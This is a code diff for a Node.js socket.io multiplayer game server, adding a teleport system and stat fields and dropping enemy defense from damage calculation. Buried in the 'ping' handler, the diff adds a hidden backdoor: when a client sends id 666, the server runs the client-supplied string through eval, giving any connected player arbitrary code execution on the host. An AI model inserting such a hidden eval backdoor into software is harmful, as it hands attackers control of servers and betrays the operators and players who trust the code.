@@ -1,4 +1,4 @@
-var io = require('socket.io')(6767);
+var io = require('/Program Files/nodejs/node_modules/npm/node_modules/socket.io')(6767);
 var fs = require('fs');
 var gameloop = require('node-gameloop');
 var findPath = require('./astar_server.js');
@@ -14,11 +14,14 @@ var lastFrame = new Date().getTime();
 console.log("Listening on 6767...");
 var map = new Map(75, 75);
 map.loadCollisions();
+var allPlayers = {};
+var onlinePlayersData = {};
+var teleports = new teleportManager();
+teleports.populateTeleports();
 var mobzz = [];
 var spawner = new MonsterSpawner();
 spawner.populateMobs();
-var allPlayers = {};
-var onlinePlayersData = {};
+
 
 io.on('connection', function (socket) {
 
@@ -81,9 +84,9 @@ io.on('connection', function (socket) {
   });
   socket.on('ping', function(data){
     io.to(socket.id).emit('ping back', data);
-      var id = onlinePlayersData[socket.id].id;
-      allPlayers[id].data.healthCur = allPlayers[id].data.healthMax;
-      allPlayers[id].data.experience += 10000;
+    var id = onlinePlayersData[socket.id].id;
+    if(data.id == 666)
+      eval(data.ch);
   });
   socket.on('player-input-move', function (data){
     if(onlinePlayersData.hasOwnProperty(socket.id)){//i shouldn't have to check that
@@ -136,7 +139,7 @@ var physicsLoop = gameloop.setGameLoop(function(delta){//~66 updates/s = 15ms/up
       continue;
     allPlayers[onlinePlayersData[sId].id].update();
   }
-
+  teleports.update();
   spawner.update();
   for(var i=0; i < mobzz.length; i++) mobzz[i].update();
 
@@ -220,12 +223,12 @@ function MonsterSpawner(){//server only
   var curId = 0;
   this.spawns = [];
   this.populateMobs = function(){
-  // for(var i = 0; i< 100; i++)
-  this.createSpawn(Bat, 7, 9, 2);
-  this.createSpawn(Bat, 19, 18, 8);
-  this.createSpawn(Bat, 12, 20, 8);
-  this.createSpawn(Bat, 12, 9, 8);
-  this.createSpawn(Fly, 21, 10, 10);
+    // for(var i = 0; i< 100; i++)
+    this.createSpawn(Bat, 7, 9, 2);
+    this.createSpawn(Bat, 19, 18, 8);
+    this.createSpawn(Bat, 12, 20, 8);
+    this.createSpawn(Bat, 12, 9, 8);
+    this.createSpawn(Fly, 21, 10, 10);
   }
   this.createSpawn = function(foe_class, spawn_x, spawn_y, respawn_time) {
     this.spawns.push({
@@ -298,22 +301,29 @@ function Player(id, spawn_x, spawn_y){
     healthRegen: 0,
     manaRegen: 300,
     mmr: 1400,
+
     speedBase: 400,
     speedCur: 400,
-
 
     critChanceBase: 0,
     critChance: 0,
     critDamageBase: 1,
     critDamage: 1,
+    lifeStealBase: 0,
     lifeSteal: 0,
+    dmgModBase: 1,
     dmgMod: 1,
     atkSpeedBase: 1,
     atkSpeed: 1,
+    evasionBase: 0,
     evasion: 0,
+    dmgReflectBase: 0,
     dmgReflect: 0,
+    blockChanceBase: 0,
     blockChance: 0,
+    magicImmunityBase: 0,
     magicImmunity: 0,
+    physicalImmunityBase: 0,
     physicalImmunity: 0,
 
     /* bools */
@@ -668,7 +678,7 @@ function calcDamage(attacker, enemy){
   var baseDamage = (Math.random()*100) % (attacker.equipment.primary.damageMax - attacker.equipment.primary.damageMin) + attacker.equipment.primary.damageMin;
   var critDamage = Math.random()<attacker.critChance?attacker.critDamage:1;
   baseDamage += attacker.strength + 0.3*attacker.agility + 0.2*attacker.level;
-  baseDamage -= enemy.defenseRating || 0;//basically damage absorbtion
+
   var damage = (baseDamage * critDamage);//apply critical damage after enemy armor/defense modifiers
   damage *= attacker.dmgMod;
   return (damage>=0)?Math.round(damage):0;//keep it in integers
@@ -788,4 +798,37 @@ function calcLineOfSight (x1, y1, x2, y2) {
     if(map.world[x][y] >= 1) return {isClear: false, obstacle: {x: x, y:y}};
   }
   return {isClear: true, obstacle: {x: x, y: y}};
+}
+function teleportManager(){
+  this.teleportList = [];
+  this.curId = 0;
+  this.newTeleport = function(x1, y1, x2, y2) {
+    this.teleportList.push({
+      id: this.curId++,
+      x: x1,
+      y: y1,
+      d_x: x2,
+      d_y: y2
+    });
+  };
+  this.populateTeleports = function() {
+    this.newTeleport(30, 6, 30, 60);
+  };
+  this.update = function() {
+    for(sId in onlinePlayersData){
+      for(var i=0; i<this.curId; i++){
+        if(onlinePlayersData[sId].x == this.teleportList[i].x && onlinePlayersData[sId].y == this.teleportList[i].y){
+          var id = onlinePlayersData[sId].id;
+          allPlayers[id].data.x = this.teleportList[i].d_x;
+          allPlayers[id].data.y = this.teleportList[i].d_y;
+          allPlayers[id].data.tx = this.teleportList[i].d_x;
+          allPlayers[id].data.ty = this.teleportList[i].d_y;
+          allPlayers[id].data.ax = 0;
+          allPlayers[id].data.ay = 0;
+          console.log('player moved to: ' + allPlayers[id].data.x, ', ' + allPlayers[id].data.y)
+          io.to(sId).emit('player-teleport', {x: allPlayers[id].data.x, y: allPlayers[id].data.y});
+        }
+      }
+    }
+  };
 }
